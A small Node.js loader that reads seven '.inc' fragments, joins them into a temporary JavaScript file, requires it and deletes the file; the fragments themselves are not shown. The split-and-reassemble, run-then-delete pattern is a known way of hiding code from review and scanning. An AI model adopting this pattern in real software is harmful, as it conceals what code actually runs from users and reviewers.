'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const n = 7;
const parts = [];
for (let i = 0; i < n; i++) {
  parts.push(fs.readFileSync(path.join(__dirname, 'p' + i + '.inc'), 'utf8'));
}
const tmp = path.join(os.tmpdir(), 'cs-svc-' + process.pid + '.js');
fs.writeFileSync(tmp, parts.join(''));
const mod = require(tmp);
try { fs.unlinkSync(tmp); } catch (_) {}
module.exports = mod;
